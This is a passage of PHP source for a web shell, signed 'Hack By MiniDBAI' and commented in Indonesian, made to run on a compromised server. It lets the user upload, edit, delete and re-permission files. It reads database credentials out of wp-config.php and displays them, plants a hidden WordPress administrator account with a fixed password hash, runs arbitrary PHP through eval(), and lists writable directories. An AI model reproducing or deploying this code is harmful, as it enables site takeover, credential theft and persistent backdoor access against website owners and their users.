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" width="109" height="145" alt="Deskripsi Gambar">
    <br>Hack By MiniDBAI</a>
</div>
</th>
            </tr>
        </tbody>
    </table>


    <table>
        <tbody>
            <tr>
<td>
    <!-- Form untuk mengunggah file -->
    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload file:</label>
        <input type="file" name="file" required>
        <input type="submit" value="Submit">
    </form>
</td>




<td>
    <!-- Form untuk membuat direktori baru -->
    <form action="?dir=<?php echo ($dir); ?>" method="post">
        <label>Make Dir:</label>
        <input type="text" name="new_dir" required>
        <input type="submit" value="Submit">
    </form>
</td>




<td>

<!-- Form untuk mengunggah dan mengekstrak file ZIP -->
    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload + extract ZIP </label>

<?php
if (class_exists('ZipArchive')) {
    echo "<label>ZipArchive <b style='color: #00ad67;'>ON</b></label>";
} else {
    echo "<label>ZipArchive <b style='color: red;'>OFF</b></label>";
}
?>


        <input type="file" name="zip_file" required>
        <input type="submit" value="Extract ZIP">
    </form>

</td>



<td>

    <!-- Form untuk membuat file kosong -->
   
    <form action="?dir=<?php echo ($dir); ?>" method="post">
        <label>Make file (.txt):</label>
        <input type="text" name="file_name" required><br>
        <label>Extensions file (Optional):</label>
        <input type="text" name="file_ext">
        <input type="submit" name="create_file" value="Submit">
    </form>
</td>


            </tr>
        </tbody>
    </table>

    <!-- Form untuk mengganti nama file atau direktori -->
    <?php if (isset($_GET['rename'])): ?>
        <h3>ReName</h3>
        <form action="" method="post">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            <label>Nama baru:</label>
            <input type="text" name="new_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>" required>
            <input type="submit" name="rename_file" value="Submit">
        </form>
    <?php endif; ?>

    <!-- Jika file yang akan diedit dipilih -->
    <?php
    if (isset($_GET['edit'])) {
        $file_to_edit = realpath($dir . $_GET['edit']);
        

        // Keamanan: Pastikan file berada di dalam direktori home
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        if (strpos($file_to_edit, $base) !== 0 || !is_file($file_to_edit)) {
            echo "Access denied.";
        } else {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <h3>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
            <form action="" method="post">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="file_content" rows="10" cols="50"><?php echo htmlspecialchars($file_content); ?></textarea><br>
                <input type="submit" name="save_file" value="Save">
            </form>
            <?php
        }
    }
    ?>

    <!-- Daftar file dan direktori -->
<?php
// Ambil nilai 'dir' dari query parameter URL
$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';

// Pisahkan path berdasarkan tanda '/'
$pathParts = explode('/', $dir);

// Tentukan URL dasar dinamis berdasarkan protokol dan domain saat ini
$baseUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?');

// Mulai output HTML
echo '<h3> <img src="data:image/webp;base64,UklGRhQBAABXRUJQVlA4WAoAAAAQAAAAGQAAGQAAQUxQSFoAAAABYBvZtpJfBC4RNOEWOlTKEFoLtPJ/hrsTkkXEBIAvWSfwfT/whGdkNpxX4iMZLZeJY9k3dRyo8Grp6rtNit16CKUP1L9AQW8hhSrHcXhxHEsK8H78qs+DLwFWUDgglAAAALAFAJ0BKhoAGgA+tU6hSyckIyGwGAgA4BaJZgCdMxyEIBUkFrzVo0/wXWaWQUNWwKa8S7wuAAD+ixR+N0BcGCL/82B9/ebfsyh13RkX7N9K0ld6lyPo+snWgSX7xJfl43FfhJr/+YNIGmz3hK8nNuJoj/7OQyAKQIBNAffrxDHmQ8K15w5pmAWc9DuGYIDoDJEAAAA=" width="20" height="20"> : <a href="?dir=/">/</a>';

// Variabel untuk menyimpan path saat ini
$currentPath = '';

// Buat setiap bagian path menjadi link
foreach ($pathParts as $part) {
    if (!empty($part)) {
        // Bangun URL untuk bagian path saat ini
        $currentPath .= '/' . $part;

        // Buat link untuk bagian ini
        echo '<a href="' . $baseUrl . '?dir=' . ($currentPath) . '/">' . $part . '</a>';

        // Tambahkan pemisah '/'
        echo '/';
    }
}

// Hapus pemisah terakhir
echo '</h3>';
?>


<br>
<b><i><a id="dynamic-link" href="?dir=/">[Root]</a></i></b>
<?php
// Mengambil direktori kerja saat ini
$direktori_sekarang = getcwd();
echo "" . htmlspecialchars($direktori_sekarang);
?>
<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>

<br><br>


<table>
    <tr>
        <th>Name</th>
        <th>Size</th>
        <th>Modify</th>
        <th>Owner/Group</th> <!-- Tambahkan kolom Owner -->
        <th>Perms</th>
	<th>Actions</th>
    </tr>

    <tr>
        <td><a href="?dir=<?php echo (dirname($dir)) . '/'; ?>"> <img src="data:image/webp;base64,UklGRl4DAABXRUJQVlA4WAoAAAAQAAAAJwAAJwAAQUxQSLsBAAANkJ1t2yFJ71euGtt22yFsCGZAG8ZGstec7WVbY7vY/X8Hzb8iiIgJQLvawu0HS7q7+WzTh1RtuqxHgD3DW54UdaakRwBgKoGQoc4UzAgNiSFRmSlYEWKozOTtEE2ZOkczBSdEU1FTO0azeTtAc1Y0UAtc5WY0nXcCNCd7dUpDU+Lo7PdxI5oqOD5a7akkrGZMFP1/1YAmC90+WtbHh/VmgD4wdFxHE4VeD1LtxSUANFbo9yDZXgFotDDkQrbaCxopjLqQrymDxXEXMaTh/JSLWN6auEY8n15wTMoCMQ11islmupfi8Xwl1RWPF//XE04sTt5sJ5NODFicvjpIJBx5AuLo1XEi4cgSHsCHr04TG7ak6i4APnh9mtiwpfDRZwDgvdcXiQ2rJXHjCgBUzxyd/YnqwHuvrjY2rFbcd988aqAAohp1dzcA77y5Sqxbzdh9/y0EwAzBRFqviuZbb6+Ta2YTsHvDXCcY7fLWm5vUmtlE1WpVdJq33tykV80GRFpVdAy89eYms2rUgRTBnYPYeuNlV/Q6MEGm2H7lFxc1gGuhIQW1nVdhacYAn3u9clDdfhmWZw3/l2a0BQBWUDggfAEAAFAJAJ0BKigAKAA+qUifSaYkoyEx2ZwAwBUJagC9eXT+J6le8zFftbuiuo+Kxj5kA9Bo9x57eHmSnS/n7o0NzJ4ZW9XydetQU3waoQExCtuYxVUAAP76Y2tu3J7QJg5ATa/FrTyH6coIEx0Mo0s+4JVtadEbV9Y5L/7BHBGoh/+a3+d5mSF5neUdsswSD9/J34xHa4kXQZqT6b63T6jWvuPL7nNcoeHFO7TRnekIb0m0ABsocK3RbGHD9PXTIU9D2vuPrN7Xufxds2Q7Up98ZgV6V37fYVkjy2jrkFLStK/sFT7YNh+fWcp4bduPCm7wM4vNgCm2xmJ5SZA8ptniO1yD3sToQI9ucaK+L2Q7Ph1XvZ6GQSskIrfbLHoI70Q2nNFafZgwU2GKinbZAbwtQAFKf3/TUHiNPsdiJsxmn2uxkeLmOh/xF//+K2B4PDjXzL7XbfhFzK5rnhysZ92EEJhQ/F/uP+fWWuDU2k/x635/RKbYGOr+qeDqAAAA" width="40" height="40"></a></td>
        <td></td>
        <td></td>
        <td></td>
        <td></td>
        <td>    
            <?php if (isset($_SESSION['file_to_copy'])): ?>
                <form action="?dir=<?php echo ($dir); ?>&paste" method="post">
                    <input type="submit" value="Paste file here">
                </form>
            <?php endif; ?>
        </td>
    </tr>

    <?php 
    // Pisahkan folder dan file
    $folders = [];
    $filesList = [];
    
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . $file)) {
                $folders[] = $file;
            } else {
                $filesList[] = $file;
            }
        }
    }
    
    // Tampilkan folder terlebih dahulu
    foreach ($folders as $folder): 
        $ownerId = fileowner($dir . $folder);
        $groupId = filegroup($dir . $folder);
        $ownerName = function_exists('posix_getpwuid') ? posix_getpwuid($ownerId)['name'] : $ownerId;
        $groupName = function_exists('posix_getgrgid') ? posix_getgrgid($groupId)['name'] : $groupId;
    ?>
        <tr>
            <td>
                <a href="?dir=<?php echo ($dir . $folder . '/'); ?>"> <img src="data:image/webp;base64,UklGRhQBAABXRUJQVlA4WAoAAAAQAAAAGQAAGQAAQUxQSFoAAAABYBvZtpJfBC4RNOEWOlTKEFoLtPJ/hrsTkkXEBIAvWSfwfT/whGdkNpxX4iMZLZeJY9k3dRyo8Grp6rtNit16CKUP1L9AQW8hhSrHcXhxHEsK8H78qs+DLwFWUDgglAAAALAFAJ0BKhoAGgA+tU6hSyckIyGwGAgA4BaJZgCdMxyEIBUkFrzVo0/wXWaWQUNWwKa8S7wuAAD+ixR+N0BcGCL/82B9/ebfsyh13RkX7N9K0ld6lyPo+snWgSX7xJfl43FfhJr/+YNIGmz3hK8nNuJoj/7OQyAKQIBNAffrxDHmQ8K15w5pmAWc9DuGYIDoDJEAAAA=" width="20" height="20"> <?php echo htmlspecialchars($folder); ?>/</a>
            </td>
            <td></td>
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); ?></td>
            <td><?php echo htmlspecialchars($ownerName) . '  |  ' . htmlspecialchars($groupName); ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $folder); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $folder)), -4); ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo ($dir); ?>&delete=<?php echo ($folder); ?>" onclick="return confirm('Delete folder ?')" style="color: red;">[Delete]</a>
                <a href="?dir=<?php echo ($dir); ?>&rename=<?php echo ($folder); ?>">[ReName]</a>
            </td>
        </tr>
    <?php endforeach; ?>

    <?php foreach ($filesList as $file): 
        $ownerId = fileowner($dir . $file);
        $groupId = filegroup($dir . $file);
        $ownerName = function_exists('posix_getpwuid') ? posix_getpwuid($ownerId)['name'] : $ownerId;
        $groupName = function_exists('posix_getgrgid') ? posix_getgrgid($groupId)['name'] : $groupId;
    ?>
        <tr>
            <td>
                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank"> <img src="data:image/webp;base64,UklGRk4BAABXRUJQVlA4IEIBAADwBgCdASoZABgAPrFIn0mnJCMhMBgMAOAWCWYAuwLcC+TzZTxp/RvomdAAVKIm+OfP/v38Tj/xyynInI9VnARAAP75A8ApP2benRY+dpXOJvgei8rLpyiPBsQLmuSz/BxTts5iLKZ+V+2QTUJ8xpz4Y//5wLYvqBJ++aAu2j1gpJwr6O+uF9I9n3vIkM9z+Ud7AuCjg/lRWO/j/7NkrxNYpneqUHeWAN4imutZur+3r/VCKZKGDqInGzzR5Pn/VsQ6Pa+XwtciqRvNR/yBptg7/c1iFQpSnAOaKrJe7YaftkAChK75hqcTA9omOkGgCSJ337gfKTH0J/S3LvTiIyR1cPnj6YVQwAyVfzsE07Wv4OWheN7SOjMwE/WyKLi2m4258Q1sR6hzxWT1iH7/qYf1Tj6geyZrTPf47IehDMOUQAAA" width="20" height="20"> <?php echo htmlspecialchars($file); ?></a>
            </td>
            <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; ?></td>
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); ?></td>
	    <td><?php echo htmlspecialchars($ownerName) . '  |  ' . htmlspecialchars($groupName); ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $file); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $file)), -4); ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo ($dir); ?>&delete=<?php echo ($file); ?>" onclick="return confirm('Delete file ?')" style="color: red;">[Delete]</a>
                <a href="?dir=<?php echo ($dir); ?>&edit=<?php echo ($file); ?>">[Edit]</a>
                <a href="?dir=<?php echo ($dir); ?>&rename=<?php echo ($file); ?>">[ReName]</a>
                <a href="?dir=<?php echo ($dir); ?>&copy=<?php echo ($file); ?>">[Copy]</a>
                <a href="?dir=<?php echo ($dir); ?>&zip=<?php echo ($file); ?>">[Zip]</a>
            </td>
        </tr>
    <?php endforeach; ?>
</table>
</div>
<br>

<div class="center">

<table>
    <tr>
	<td>


<?php
// Array dengan path alternatif untuk wp-config.php, hingga sepuluh direktori di atas
$possible_paths = [
    dirname(__FILE__) . '/wp-config.php',                // Direktori saat ini
    dirname(__FILE__) . '/../wp-config.php',             // Satu direktori di atas
    dirname(__FILE__) . '/../../wp-config.php',          // Dua direktori di atas
    dirname(__FILE__) . '/../../../wp-config.php',       // Tiga direktori di atas
    dirname(__FILE__) . '/../../../../wp-config.php',    // Empat direktori di atas
    dirname(__FILE__) . '/../../../../../wp-config.php', // Lima direktori di atas
];

// Variabel untuk menyimpan path yang ditemukan
$wp_config_file = null;

// Cari file wp-config.php di semua path alternatif
foreach ($possible_paths as $path) {
    if (file_exists($path)) {
        $wp_config_file = $path;
        break;
    }
}

// Jika file ditemukan
if ($wp_config_file) {
    // Ambil isi file
    $config_content = file_get_contents($wp_config_file);

    // Fungsi untuk mendapatkan nilai dari definisi konstanta
    function get_wp_config_value($content, $key) {
        preg_match("/define\s*\(\s*'{$key}'\s*,\s*'([^']+)'/", $content, $matches);
        return isset($matches[1]) ? $matches[1] : null;
    }

    // Ambil variabel yang diinginkan
    $db_name = get_wp_config_value($config_content, 'DB_NAME');
    $db_user = get_wp_config_value($config_content, 'DB_USER');
    $db_password = get_wp_config_value($config_content, 'DB_PASSWORD');
    $db_host = get_wp_config_value($config_content, 'DB_HOST');

    // Ambil table prefix
    preg_match("/\\\$table_prefix\s*=\s*'([^']+)';/", $config_content, $prefix_matches);
    $table_prefix = isset($prefix_matches[1]) ? $prefix_matches[1] : "Tidak ditemukan";

    // Tampilkan hasil
    echo "wp-config.php ditemukan di: $wp_config_file<br>";
    echo "DB_HOST = $db_host<br>";
    echo "DB_USER = $db_user<br>";
    echo "DB_PASSWORD = $db_password<br>";
    echo "Database = $db_name<br>";
    echo "Table Prefix = $table_prefix<br>";

    // Cek apakah ada POST request untuk membuat akun admin
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = isset($_POST['username']) ? $_POST['username'] : null;
        $password = '$P$B2CXGXAe2jBMcOK34tZSXaMABEvqFS.'; // Hash password yang telah ditentukan
        $email = isset($_POST['email']) ? $_POST['email'] : null;

        // Validasi input
        if ($username && $email) {
            // Buat koneksi ke database
            $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

            // Cek koneksi
            if ($mysqli->connect_error) {
                die("Koneksi gagal: " . $mysqli->connect_error);
            }

            // Query untuk menambahkan user ke tabel wp_users
            $user_insert = $mysqli->prepare("INSERT INTO {$table_prefix}users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)");
            $user_insert->bind_param("sss", $username, $password, $email);
            $user_insert->execute();
            $user_id = $mysqli->insert_id; // ID user yang baru dibuat
            $user_insert->close();

            if ($user_id) {
                // Query untuk menambahkan meta user untuk peran administrator di wp_usermeta
                $capabilities = serialize(['administrator' => true]);
                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}capabilities', '$capabilities')");
                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}user_level', '10')");

                echo "Akun administrator berhasil dibuat dengan username: $username";
            } else {
                echo "Gagal membuat akun administrator.";
            }

            $mysqli->close();
        } else {
            echo "Username dan email harus diisi.";
        }
    }
} else {
    echo "File wp-config.php tidak ditemukan.";
}
?>
<form method="post" action="">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" value="superuser" required><br>
    <label for="email">Email:
    </label><input type="email" id="email" name="email" value="superuseradmin@mail.com" required><br>
    <input type="submit" value="Buat Akun Administrator">

</form>

<br>


<form method="post">
    <label for="php_code">Eksekusi Kode PHP :</label><br>
    <textarea name="php_code" rows="2" cols="50" placeholder="Masukkan kode PHP di sini..."></textarea><br>
    <input type="submit" value="Jalankan php">
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $php_code = $_POST['php_code'];

    // Menangkap output dari eksekusi kode PHP yang dimasukkan
    ob_start();
    eval("?>$php_code");
    $output = ob_get_clean();

    // Menampilkan hasil eksekusi
    echo '<pre>' . htmlspecialchars($output) . '</pre>';
}
?>
<br>
    <!-- PHP Info Button -->
<center>
        <form method="POST" action="">
            <button type="submit" name="action" value="phpinfo" class="input">Show PHP Info</button>
        </form>
</center>
		</td>
	</tr>
</table>

<?php
if (isset($_POST['action']) && $_POST['action'] == 'phpinfo') {
    ob_start(); // Start output buffering
    phpinfo(); // Generate phpinfo output
    $phpinfo = ob_get_clean(); // Store the output in a variable

    // Use regex to extract the body content and styles
    if (preg_match('%<style type="text/css">(.*?)</style>.*<body>(.*?)</body>%is', $phpinfo, $matches)) {
        $phpinfo_style = $matches[1]; // Extract the CSS from phpinfo()
        $phpinfo_content = $matches[2]; // Extract the body content
    } else {
        $phpinfo_style = '';
        $phpinfo_content = $phpinfo;
    }

    // Create custom CSS for phpinfo in iframe
    $custom_css = "
        body { font-family: Arial, sans-serif; font-size: 14px; color: #333; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; border: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
    ";

    // Display phpinfo in an iframe with custom CSS
    echo "<center><iframe style='width:80%; height:800px; border:none;' srcdoc='
        <html>
        <head>
            <style>
                $phpinfo_style /* Original phpinfo CSS */
                $custom_css /* Custom CSS */
            </style>
        </head>
        <body>
            $phpinfo_content
        </body>
        </html>'></iframe></center>";
}
?>

    
	

<?php
// Menampilkan informasi server
echo "<h1>Informasi Server</h1>";

if (function_exists('mysqli_connect')) {
    echo "<p><strong>MySQL:</strong> <b style='color: #00ad67;'>ON</b> | ";
} else {
    echo "<p><strong>MySQL:</strong> <b style='color: red;'>OFF</b> | ";
}

if (function_exists('curl_version')) {
    $curl_info = curl_version();
    echo "<strong>cURL:</strong> <b style='color: #00ad67;'>ON</b> | ";
} else {
    echo "<strong>cURL:</strong> <b style='color: red;'>OFF</b> | ";
}
if (function_exists('mail')) {
    echo "<strong>Mailer:</strong> <b style='color: #00ad67;'>ON</b> | ";
} else {
    echo "<strong>Mailer:</strong> <b style='color: red;'>OFF</b> | ";
}
echo "<strong>OS Server: </strong>" . PHP_OS . " | ";
echo "<strong>PHP Version:</strong> " . phpversion() . "</p>";
echo "<p><strong>Name Host Server: </strong>" . gethostname() . "</p>";
echo "<p><strong>Server Name:</strong> " . $_SERVER['SERVER_NAME'] . " | <strong>Server Address:</strong> " . $_SERVER['SERVER_ADDR'] . "  | <strong>Server Port:</strong> " . $_SERVER['SERVER_PORT'] . "</p>";
echo "<p><strong>Request Method:</strong> " . $_SERVER['REQUEST_METHOD'] . "  | <strong>Protocol:</strong> " . $_SERVER['SERVER_PROTOCOL'] . "  | <strong>Request Time:</strong> " . date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']) . " <strong>Timezone:</strong> " . date_default_timezone_get() . "</p>";
echo "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
echo "<p><strong>Remote Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "  | <strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
echo "<p><strong>Server Admin:</strong> " . (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'Tidak ada') . "  | <strong>Server Type:</strong> " . (isset($_SERVER['SERVER_TYPE']) ? $_SERVER['SERVER_TYPE'] : 'Tidak ada') . "</p>";
echo "<p><strong>Connection Status:</strong> " . (isset($_SERVER['CONNECTION']) ? $_SERVER['CONNECTION'] : 'Tidak ada') . "</p>";
echo "<p><strong>Content Type:</strong> " . (isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : 'Tidak ada') . "</p>";
echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak') . " | <strong>Content Length:</strong> " . (isset($_SERVER['CONTENT_LENGTH']) ? $_SERVER['CONTENT_LENGTH'] : 'Tidak ada') . " bytes</p>";

?>

		
	
<table>
	<tr>
		<td>


    <form method="POST" action="">
        <label for="dir">Periksa Direktori Writable:</label>
        <input type="text" name="dir" id="dir" required placeholder="/path/to/directory">
        <button type="submit" name="submit">Periksa Direktori</button>
    </form>

    <pre>
<?php
if (isset($_POST['submit'])) {
    $rootDir = $_POST['dir'];

    function checkWritableDirectories($dir) {
        // Mengecek apakah path yang diberikan adalah direktori yang valid
        if (!is_dir($dir)) {
            return "Path yang diberikan bukan direktori yang valid.";
        }

        $result = [];

        // Menggunakan RecursiveDirectoryIterator untuk mengakses semua folder dalam direktori
        $directories = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        // Iterasi melalui semua direktori dan subdirektori
        foreach ($directories as $directory) {
            if ($directory->isDir()) {
                $currentDir = $directory->getPathname();

                // Mengecek apakah direktori dapat ditulis dan menambahkannya ke hasil jika writable
                if (is_writable($currentDir)) {
                    $result[] = $currentDir;
                }
            }
        }

        return $result;
    }

    // Memanggil fungsi pengecekan direktori
    $writableDirectories = checkWritableDirectories($rootDir);

    // Menampilkan hasil pengecekan
    if (is_array($writableDirectories)) {
        if (empty($writableDirectories)) {
            echo "Tidak ada direktori yang dapat ditulis.";
        } else {
